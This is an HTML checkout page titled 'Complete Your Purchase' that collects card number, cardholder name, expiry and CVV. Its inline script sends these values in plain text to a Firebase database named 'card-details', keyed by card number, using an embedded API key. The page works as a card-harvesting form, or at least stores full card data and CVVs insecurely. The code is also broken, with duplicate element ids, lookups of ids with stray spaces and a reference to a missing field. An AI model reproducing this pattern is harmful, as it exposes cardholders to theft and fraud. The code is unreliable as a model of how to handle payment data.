<!DOCTYPE html>

    <html lang="en">

    <head>

        <meta charset="UTF-8">

        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <title>

            Complete Your Purchase

        </title>

        <!-- custom css file link  -->
        <link rel="stylesheet" href="Payment.css">
        
        

    </head>

    <body>

    <div class="container">

        <div class="card-container">

            <div class="front">

                <div class="image">

                    <img src="https://i.imgur.com/iPjGMpM.png" alt = "chip">

                    <img src="https://i.imgur.com/HDMROff.png" alt = 'visa'>

                </div>

                <div class="card-number-box">
                    
                    ################
                
                </div>

                <div class="flexbox">

                    <div class="box">

                        <div class="card-holder-name">
                            
                            Name of card holder
                    
                        </div>

                    </div>

                    <div class="box">

                        <span>
                            
                            expiry
                        
                        </span>

                        <div class="expiration">

                            <span class="exp-month">
                                
                                mm / 
                            
                            </span>

                            <span class="exp-year">
                                
                                yyyy
                            
                            </span>

                        </div>

                    </div>

                </div>

            </div>
            

            <div class="back">

                <div class="stripe"> </div>

                <div class="box">

                    <span>
                        
                        cvv
                    
                    </span>

                    <div class="cvv-box"> </div>

                    <img src="https://i.imgur.com/HDMROff.png" alt = "Visa">

                </div>

            </div>

        </div>

        <form action="">

            <div class="inputBox">

                <span>
                    
                    card number
                
                </span>

                <input type="text" maxlength="16" class="card-number-input" required id="cardno">

            </div>

            <div class="inputBox">

                <span>
                    
                    name on card
                
                </span>

                <input type="text" class="card-holder-input" required id="cardname">

            </div>

            <div class="flexbox">

                <div class="inputBox">

                    <span>
                        
                        expiry mm
                    
                    </span>

                    <select name="" id="" class="month-input" required id="month">

                        <option value="month" selected disabled>
                            
                            month
                        
                        </option>

                        <option value="01">
                            
                            01
                        
                        </option>

                        <option value="02">
                            
                            02
                        
                        </option>

                        <option value="03">
                            
                            03
                        
                        </option>

                        <option value="04">
                            
                            04
                        
                        </option>

                        <option value="05">
                            
                            05
                        
                        </option>

                        <option value="06">
                            
                            06
                        
                        </option>

                        <option value="07">
                            
                            07
                        
                        </option>

                        <option value="08">
                            
                            08
                        
                        </option>

                        <option value="09">
                            
                            09
                        
                        </option>

                        <option value="10">
                            
                            10
                        
                        </option>

                        <option value="11">
                            
                            11
                        
                        </option>

                        <option value="12">
                            
                            12
                        
                        </option>

                    </select>

                </div>

                <div class="inputBox">

                    <span>
                        
                        expiry yy
                    
                    </span>

                    <select name="" id="" class="year-input" required id="year">

                        <option value="year" selected disabled>
                            
                            year
                        
                        </option>

                        <option value="2022">
                            
                            2022
                        
                        </option>

                        <option value="2023">
                            
                            2023
                        
                        </option>

                        <option value="2024">
                            
                            2024
                        
                        </option>
                        
                        <option value="2025">
                            
                            2025
                        
                        </option>
                        
                        <option value="2026">
                            
                            2026
                        
                        </option>
                        
                        <option value="2027">
                            
                            2027
                        
                        </option>
                        
                        <option value="2028">
                            
                            2028
                        
                        </option>
                        
                        <option value="2029">
                            
                            2029
                        
                        </option>
                        
                        <option value="2030">
                            
                            2030
                        
                        </option>
                        
                        <option value="2031">
                            
                            2031
                        
                        </option>

                    </select>

                </div>

                <div class="inputBox">

                    <span>
                        
                        cvv
                    
                    </span>

                    <input type="text" maxlength="4" class="cvv-input" required id="cvv">

                </div>

            </div>

            <button type="button" class="submit-btn" id="submit">

                <a href = 'thankyou.html' style = 'color: white; text-decoration: none;'>
                    
                    Submit

                </a>
            
                <script type="module">
                   
                    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
                    import { getDatabase, ref, get ,set} from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";

                    // TODO: Add SDKs for Firebase products that you want to use
                    // https://firebase.google.com/docs/web/setup#available-libraries
                  
                    // Your web app's Firebase configuration
                    const firebaseConfig = {
                      apiKey: "AIzaSyAJUx-ieePgPm_uhcOjUvv10TWg2fBmoQM",
                      authDomain: "card-details-e5252.firebaseapp.com",
                      projectId: "card-details-e5252",
                      storageBucket: "card-details-e5252.appspot.com",
                      messagingSenderId: "622026510874",
                      appId: "1:622026510874:web:dc35759b83529dcb1bf7a3"
                    };
                  
                    // Initialize Firebase
                    const app = initializeApp(firebaseConfig);
                            const db = getDatabase(app);

                            document.getElementById("submit").addEventListener("click", function (e) {
                                set(ref(db, 'card details/' + document.getElementById("cardno").value), {
                                    cardno: document.getElementById("cardno").value,
                                    cardname: document.getElementById("cardname").value,
                                    month: document.getElementById("month").value,
                                    year: document.getElementById(" year").value,
                                    cvv: document.getElementById(" cvv").value,
                                    message: document.getElementById("message").value
                                });
                            });
                        
           </script>
            </button>
            
        </form>

    </div>
    
    <script src = 'Payment.js'> </script>

    </body>

</html>
